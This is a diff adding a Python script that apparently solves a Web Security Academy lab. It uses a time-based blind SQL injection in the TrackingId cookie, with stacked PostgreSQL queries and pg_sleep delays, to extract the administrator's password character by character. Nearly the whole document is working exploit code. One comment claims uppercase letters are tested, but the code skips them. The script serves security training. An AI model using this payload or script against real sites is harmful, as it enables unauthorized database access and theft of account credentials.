@@ -1,0 +1,45 @@
+import requests # Import the requests module to send requests
+
+# Define the lab ID (replace 'LabID-HERE' with your actual lab ID)
+labID = 'LabID-HERE'
+
+# Construct the target URL
+url = f'https://{labID}.web-security-academy.net/filter?category=Lifestyle'
+
+# Initialize an empty list to store the extracted password characters
+data = list()
+
+def blind_SQLi():
+    # Iterate over the positions of the password characters (assuming a maximum length of 20)
+    for pos in range(1, 21):
+        print(f'Character number : # {pos} #')  # Print the current character position being tested
+
+        # Iterate over the ASCII values of possible characters (48-122: digits, uppercase, and lowercase letters)
+        for char in range(48, 123):
+            # Skip non-alphanumeric characters (e.g., special characters between digits and letters)
+            if (char > 57 and char < 97):
+                continue
+
+            # Construct the SQL injection payload to test if the character at the current position matches
+            payload = f"'%3BSELECT CASE WHEN (SUBSTRING(password, {pos},1) = '{chr(char)}') THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--"
+
+            # Add the payload to the 'TrackingId' cookie
+            header = {
+                'Cookie': "TrackingId=abc" + payload
+            }
+
+            # Send the HTTP GET request with the malicious header
+            response = requests.get(url, headers=header)
+
+            # Check if the server's response time indicates a match (greater than 2.9 seconds)
+            if response.elapsed.total_seconds() > 2.9:
+                print(f'Found! : {chr(char)}')  # Print the matched character
+                data += chr(char)  # Add the matched character to the password list
+                break  # Exit the loop for the current position
+            else:
+                print(f'Invalid: {chr(char)}')  # Print the invalid character being tested
+
+    # Print the final extracted password
+    print(f'Password : {"".join(data)}')
+
+blind_SQLi() # Call the function to start
